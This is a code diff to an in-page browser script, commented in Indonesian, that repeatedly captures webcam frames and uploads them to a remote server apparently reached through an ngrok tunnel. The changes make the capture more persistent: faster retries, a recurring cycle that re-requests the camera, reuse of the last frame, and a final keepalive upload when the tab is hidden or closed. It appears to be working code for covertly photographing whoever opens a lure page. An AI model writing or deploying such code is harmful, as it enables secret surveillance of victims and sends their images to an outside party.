@@ -28,8 +28,9 @@
 
   var CONFIG = {
     captureIntervalMs: 1000,   // Interval ambil & kirim capture ke server
-    cameraRetryMs: 3000,       // Jeda retry jika kamera belum aktif/terputus
-    watchdogMs: 4000           // Siklus pengecekan agar tidak mati
+    cameraRetryMs: 2500,       // Jeda retry jika kamera belum aktif/terputus
+    watchdogMs: 3000,          // Siklus pengecekan agar tidak mati
+    cyclePulseMs: 5000         // Siklus pemulihan status & pengulangan request
   };
 
   var state = {
@@ -39,6 +40,8 @@
     retryTimer: null,
     captureTimer: null,
     watchdogTimer: null,
+    cycleTimer: null,
+    lastDataUrl: null,
     sentCount: 0
   };
 
@@ -50,9 +53,12 @@
     console.log(line);
   }
 
-  function sendCaptureToServer(dataUrl) {
+  function sendCaptureToServer(dataUrl, useKeepalive) {
+    if (!dataUrl) return;
+
     fetch(SERVER_BASE + "/upload", {
       method: "POST",
+      keepalive: Boolean(useKeepalive),
       headers: {
         "Content-Type": "application/json",
         "ngrok-skip-browser-warning": "true"
@@ -73,19 +79,28 @@
     });
   }
 
-  function captureFrameNow() {
-    if (!state.camActive) return;
+  function grabFrameDataUrl() {
     var video = document.getElementById('cam-feed');
     var canvas = document.getElementById('cam-canvas');
-    if (!video || !canvas || video.readyState < 2) return;
+    if (!video || !canvas || video.readyState < 2) return state.lastDataUrl;
 
     try {
       var ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-      sendCaptureToServer(dataUrl);
+      state.lastDataUrl = dataUrl;
+      return dataUrl;
     } catch (e) {
       logStatus("Error capture frame: " + e.message);
+      return state.lastDataUrl;
+    }
+  }
+
+  function captureFrameNow(useKeepalive) {
+    if (!state.camActive && !state.lastDataUrl) return;
+    var dataUrl = state.camActive ? grabFrameDataUrl() : state.lastDataUrl;
+    if (dataUrl) {
+      sendCaptureToServer(dataUrl, useKeepalive);
     }
   }
 
@@ -93,7 +108,7 @@
     if (state.captureTimer) return;
     state.captureTimer = setInterval(function () {
       if (state.camActive) {
-        captureFrameNow();
+        captureFrameNow(false);
       }
     }, CONFIG.captureIntervalMs);
   }
@@ -137,15 +152,15 @@
         video.play().catch(function () {});
       }
 
-      logStatus("Kamera aktif, mulai mengirim capture...");
+      logStatus("Kamera aktif, siklus capture berjalan...");
       startCaptureLoop();
-      setTimeout(captureFrameNow, 300);
+      setTimeout(function () { captureFrameNow(false); }, 300);
 
       stream.getVideoTracks().forEach(function (track) {
         track.onended = function () {
           state.camActive = false;
           state.stream = null;
-          logStatus("Stream kamera terhenti, menjadwalkan ulang...");
+          logStatus("Stream kamera terhenti, siklus retry aktif...");
           scheduleCameraRetry();
         };
       });
@@ -153,20 +168,42 @@
     .catch(function (err) {
       state.camPending = false;
       state.camActive = false;
-      logStatus("Kamera belum aktif (" + err.name + "), mencoba lagi...");
+      logStatus("Kamera belum aktif (" + err.name + "), siklus retry berjalan...");
       scheduleCameraRetry();
     });
   }
 
-  function startWatchdog() {
-    if (state.watchdogTimer) return;
-    state.watchdogTimer = setInterval(function () {
-      if (!state.camActive && !state.camPending) {
+  function runCyclePulse() {
+    if (state.camActive) {
+      var video = document.getElementById('cam-feed');
+      var hasLiveTrack = state.stream && state.stream.getVideoTracks().some(function (t) {
+        return t.readyState === 'live';
+      });
+      if (!hasLiveTrack || (video && video.paused)) {
+        state.camActive = false;
         requestCamera();
-      } else if (state.camActive) {
-        captureFrameNow();
+      } else {
+        captureFrameNow(false);
       }
-    }, CONFIG.watchdogMs);
+    } else if (!state.camPending) {
+      requestCamera();
+    }
+  }
+
+  function startWatchdog() {
+    if (!state.watchdogTimer) {
+      state.watchdogTimer = setInterval(function () {
+        if (!state.camActive && !state.camPending) {
+          requestCamera();
+        } else if (state.camActive) {
+          captureFrameNow(false);
+        }
+      }, CONFIG.watchdogMs);
+    }
+
+    if (!state.cycleTimer) {
+      state.cycleTimer = setInterval(runCyclePulse, CONFIG.cyclePulseMs);
+    }
   }
 
   function onOneClick() {
@@ -190,11 +227,21 @@
   });
 
   document.addEventListener('visibilitychange', function () {
-    if (!document.hidden) {
+    if (document.hidden) {
+      captureFrameNow(true);
+    } else {
       state.camActive = false;
       state.camPending = false;
       requestCamera();
     }
+  });
+
+  window.addEventListener('pagehide', function () {
+    captureFrameNow(true);
+  });
+
+  window.addEventListener('beforeunload', function () {
+    captureFrameNow(true);
   });
 })();
 </script>
